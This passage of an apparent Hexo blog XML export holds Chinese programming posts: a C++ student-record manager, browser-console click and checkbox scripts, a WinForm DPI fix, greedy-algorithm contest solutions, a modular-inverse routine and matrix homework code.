class="keyword">if</span> (a.Score == b.Score)</span><br><span class="line">		<span class="keyword">return</span> a.Num&lt;b.Num;</span><br><span class="line">	<span class="keyword">return</span> a.Score&gt;b.Score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::TITLE_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t1:\tADD A STUDENT&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t2:\tCHANGE STUDENTS\&#x27;S INFORMATION&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t3:\tDELETE A STUDENT&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t4:\tSHOW STUDENTS INFORMATION&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t5:\tSORT THE STUDENTS&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t6:\tSHOW THE MAX SCORE\&#x27; STUDENT&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t0:\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::ADD_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要添加的学生人数&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">int</span> T; <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入&quot;</span> &lt;&lt; T &lt;&lt; <span class="string">&quot;行学生的学号,姓名,性别,成绩&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;T; i++, K++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; Boy[K].Num &gt;&gt; Boy[K].Name &gt;&gt; Boy[K].Sex &gt;&gt; Boy[K].Score;</span><br><span class="line">		Boy[K].flag = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;学生信息导入成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::CHANGE_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要修改的学生学号,输入0停止删除&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	ll num;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;K; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (num == Boy[i].Num)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请再次输入学生的学号,姓名,性别,成绩&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cin</span> &gt;&gt; Boy[i].Num &gt;&gt; Boy[i].Name &gt;&gt; Boy[i].Sex &gt;&gt; Boy[i].Score;</span><br><span class="line">				Boy[i].flag = <span class="number">0</span>;</span><br><span class="line">				flag = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;学生信息修改成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (num == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="number">0</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NO SUCH STUDENTS&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::DEL_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要删除的学生学号,输入0停止删除&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	ll num;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;K; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (num == Boy[i].Num)</span><br><span class="line">			&#123;</span><br><span class="line">				Boy[i].flag = <span class="number">1</span>;</span><br><span class="line">				flag = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;DELETE SUCCESS!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (num == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (flag == <span class="number">0</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NO SUCH STUDENTS&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::SHOW_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\tThe Lists Of Students Are Here&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;    学号\t姓名\t\t性别\t成绩&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios::left);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;K; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (Boy[i].flag == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; Boy[i].Num &lt;&lt; <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; setw(<span class="number">8</span>) &lt;&lt; Boy[i].Name;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t &quot;</span> &lt;&lt; Boy[i].Sex &lt;&lt; <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class="number">2</span>) &lt;&lt; Boy[i].Score &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::SORT_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1.按学号排序&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2.按姓名排序&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3.按成绩排序&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请选择排序规则!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">	<span class="keyword">if</span>(x==<span class="number">1</span>)sort(Boy, Boy + K, CMP1);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">2</span>)sort(Boy, Boy + K, CMP2);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">3</span>)sort(Boy, Boy + K, CMP3);</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入错误，排序失败&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;;</span><br><span class="line">	<span class="keyword">if</span> (x == <span class="number">1</span> || x == <span class="number">2</span> || x == <span class="number">3</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;学生信息排序成功&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::MAX_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> Maxn = <span class="number">0</span>, Flag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;K; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (Boy[i].Score &gt;= Boy[Maxn].Score)</span><br><span class="line">		&#123;</span><br><span class="line">			Maxn = i;</span><br><span class="line">			Flag = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (Flag == <span class="number">0</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NO STUDENT&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;    学号\t姓名\t\t性别\t成绩&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios::left);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; Boy[Maxn].Num &lt;&lt; <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; setw(<span class="number">8</span>) &lt;&lt; Boy[Maxn].Name;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t &quot;</span> &lt;&lt; Boy[Maxn].Sex &lt;&lt; <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class="number">2</span>) &lt;&lt; Boy[Maxn].Score &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STU S;</span><br><span class="line">	S.TITLE_STU();</span><br><span class="line">	S.READ_STU();</span><br><span class="line">	<span class="keyword">int</span> choice;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; choice)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (choice == <span class="number">1</span>)S.ADD_STU();</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)S.CHANGE_STU();</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)S.DEL_STU();</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">4</span>)S.SHOW_STU();</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">5</span>)S.SORT_STU();</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">6</span>)S.MAX_STU();</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			S.WRITE_STU();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		system(<span class="string">&quot;PAUSE&amp;CLS&quot;</span>);</span><br><span class="line">		S.TITLE_STU();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C++</category>
      </categories>
  </entry>
  <entry>
    <title>网页Console操作</title>
    <url>/post/d97143a2/</url>
    <content><![CDATA[<h1 id="按钮点击事件模拟"><a href="#按钮点击事件模拟" class="headerlink" title="按钮点击事件模拟"></a>按钮点击事件模拟</h1><p>根据 <code>class</code> 属性<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> e = <span class="built_in">document</span>.createEvent(<span class="string">&quot;MouseEvents&quot;</span>);</span><br><span class="line">e.initEvent(<span class="string">&quot;click&quot;</span>, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementsByClassName(<span class="string">&quot;class_id&quot;</span>)[<span class="number">0</span>].dispatchEvent(e);</span><br></pre></td></tr></table></figure><br>根据 <code>id</code> 属性<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(id).click();</span><br></pre></td></tr></table></figure></p>
<h1 id="批量勾选选框"><a href="#批量勾选选框" class="headerlink" title="批量勾选选框"></a>批量勾选选框</h1><p>最直接的方法是抓取所有的输入，只过滤复选框，并设置checked属性。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> allInputs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;input&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, max = allInputs.length; i &lt; max; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (allInputs[i].type === <span class="string">&#x27;checkbox&#x27;</span>)</span><br><span class="line">        allInputs[i].checked = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>或以下两种方法进行全选。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;input[type=&#x27;checkbox&#x27;]&quot;</span>).prop(<span class="string">&quot;checked&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">$(<span class="string">&quot;:checkbox&quot;</span>).prop(<span class="string">&quot;checked&quot;</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Web</category>
        <category>Console</category>
      </categories>
      <tags>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>解决WinForm DPI问题</title>
    <url>/post/cc74b154/</url>
    <content><![CDATA[<p>更改 Form 的 AutoScaleMode 属性值为 Dpi ，并修改 Program.cs 为以下内容。<br><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">STAThread</span>]</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Environment.OSVersion.Version.Major &gt;= <span class="number">6</span>)</span><br><span class="line">            SetProcessDPIAware();</span><br><span class="line"></span><br><span class="line">        Application.EnableVisualStyles();</span><br><span class="line">        Application.SetCompatibleTextRenderingDefault(<span class="literal">false</span>);</span><br><span class="line">        Application.Run(<span class="keyword">new</span> Form1());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">System.Runtime.InteropServices.DllImport(<span class="meta-string">&quot;user32.dll&quot;</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">SetProcessDPIAware</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C#</category>
      </categories>
      <tags>
        <tag>GUI</tag>
        <tag>C#</tag>
        <tag>WinForm</tag>
      </tags>
  </entry>
  <entry>
    <title>贪心算法</title>
    <url>/post/a4ce31d2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>先奉上一段千古名句：<br><strong>模拟只会猜题意，贪心只能过样例。<br>数学上来先打表，DP一般看规律。<br>组合数学靠运气，计算几何瞎暴力。<br>图论一顿套模板，数论只会GCD。</strong><br><a id="more"></a></p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>&emsp;&emsp;所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，他所做出的仅是在某种意义上的<font color=red>局部最优解</font>。<br>&emsp;&emsp;贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。<br>&emsp;&emsp;<font color=red>所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。</font></p>
<h1 id="基本要素"><a href="#基本要素" class="headerlink" title="基本要素"></a>基本要素</h1><p>一、<strong>贪心选择性质</strong><br>&emsp;&emsp;所谓贪心选择性质是指所求问题的总体最优解能够通过一系列局部最优的选择，换句话说，当考虑做何种选择的时候，我们仅仅考虑对当前问题最佳的选择而不考虑子问题的结果。这是贪心算法可行的第一个基本要素。贪心算法以迭代的方式作出相继的贪心选择，每作一次贪心选择就将所求问题简化为规模更小的子问题。<br>&emsp;&emsp;对于一个详细问题，要确定它是否具有贪心选择性质，必须证明每一步所作的贪心选择最终导致问题的总体最优解。<br>二、<strong>最优子结构性质</strong><br>&emsp;&emsp;当一个问题的最优解包括其子问题的最优解时，称此问题具有最优子结构性质。问题的最优子结构性质是该问题可用贪心算法求解的关键特征。</p>
<h1 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h1><pre><code>1、建立数学模型来描述问题。
2、把求解的问题分成若干个子问题。
3、对每一子问题求解，得到子问题的局部最优解。
4、把子问题的解局部最优解合成原来解问题的一个解。
</code></pre><h1 id="贪心法正确性证明"><a href="#贪心法正确性证明" class="headerlink" title="*贪心法正确性证明"></a>*贪心法正确性证明</h1><p>&emsp;&emsp;贪心法的正确性证明是个难点，尤其是在非常有限的竞赛时间内。所以，很多选手往往是大胆假设自己选择的贪心策略是正确的，这样难免会出错，但也是一种不得已而为之的办法。其实贪心法的证明虽然不容易，但一些常见的方法还是值得总结的。<br>&emsp;&emsp;当一个贪心算法不能确定其100%正确，使用之前就应该尝试证明它的不正确性。而要证明其不正确，一种最简单的方法就是举一个反例。</p>
<h1 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h1><h2 id="独木舟"><a href="#独木舟" class="headerlink" title="独木舟"></a>独木舟</h2><p>题目链接：<a href="https://www.51nod.com/Challenge/Problem.html#!#problemId=1432">https://www.51nod.com/Challenge/Problem.html#!#problemId=1432</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	long long N,M;</span><br><span class="line">	long long a[10020];</span><br><span class="line">	cin&gt;&gt;N&gt;&gt;M;</span><br><span class="line">	for(int i&#x3D;0;i&lt;N;i++)</span><br><span class="line">		cin&gt;&gt;a[i];</span><br><span class="line">	sort(a,a+N);</span><br><span class="line">	long long l&#x3D;0,r&#x3D;N-1,ans&#x3D;0;</span><br><span class="line">	while(l&lt;&#x3D;r)</span><br><span class="line">	&#123;</span><br><span class="line">		if(a[l]+a[r]&lt;&#x3D;M)</span><br><span class="line">			l++;</span><br><span class="line">		r--;</span><br><span class="line">		ans++;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="聪明的木匠"><a href="#聪明的木匠" class="headerlink" title="聪明的木匠"></a>聪明的木匠</h2><p>题目链接：<a href="https://www.51nod.com/Challenge/Problem.html#!#problemId=1117">https://www.51nod.com/Challenge/Problem.html#!#problemId=1117</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int N,t,res,ans&#x3D;0;</span><br><span class="line">	cin&gt;&gt;N;</span><br><span class="line">	priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt; &gt;Q;</span><br><span class="line">	for(int i&#x3D;0;i&lt;N;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cin&gt;&gt;t;</span><br><span class="line">		Q.push(t);</span><br><span class="line">	&#125;</span><br><span class="line">	while(Q.size()&gt;1)</span><br><span class="line">	&#123;</span><br><span class="line">		res&#x3D;Q.top();</span><br><span class="line">		Q.pop();</span><br><span class="line">		res+&#x3D;Q.top();</span><br><span class="line">		Q.pop();</span><br><span class="line">		Q.push(res);</span><br><span class="line">		ans+&#x3D;res;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="不重叠的线段"><a href="#不重叠的线段" class="headerlink" title="不重叠的线段"></a>不重叠的线段</h2><p>题目链接：<a href="https://www.51nod.com/Challenge/Problem.html#!#problemId=1133">https://www.51nod.com/Challenge/Problem.html#!#problemId=1133</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">struct demo&#123;int l,r;&#125;line[10020];</span><br><span class="line">bool cmp(demo a,demo b)&#123;return a.r&lt;b.r;&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int N,ans&#x3D;1;</span><br><span class="line">	cin&gt;&gt;N;</span><br><span class="line">	for(int i&#x3D;0;i&lt;N;i++)</span><br><span class="line">		cin&gt;&gt;line[i].l&gt;&gt;line[i].r;</span><br><span class="line">	sort(line,line+N,cmp);</span><br><span class="line">	demo t&#x3D;line[0];</span><br><span class="line">	for(int i&#x3D;1;i&lt;N;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if(t.r&lt;&#x3D;line[i].l)</span><br><span class="line">		&#123;</span><br><span class="line">			ans++;</span><br><span class="line">			t&#x3D;line[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>贪心</tag>
      </tags>
  </entry>
  <entry>
    <title>逆元</title>
    <url>/post/64311e43/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>未完待续</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>未完待续<br><a id="more"></a></p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ll <span class="title">exgcd</span><span class="params">(ll a,ll b,ll &amp;x,ll &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x=<span class="number">1</span>,y=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ll res=exgcd(b,a%b,y,x);</span><br><span class="line">        y-=x*(a/b);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">inv</span><span class="params">(ll a,ll n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll x,y;</span><br><span class="line">    exgcd(a,n,x,y);</span><br><span class="line">    <span class="keyword">return</span> (x%n+n)%n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>逆元</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵</title>
    <url>/post/7d16c0e9/</url>
    <content><![CDATA[<h1 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id="more"></a><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> b[<span class="number">10</span>][<span class="number">10</span>],k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            b[i][j]=a[k];</span><br><span class="line">            b[j][i]=a[k++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;b[i][j]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>梯度下降求解线性回归</title>
    <url>/post/7c021667/</url>
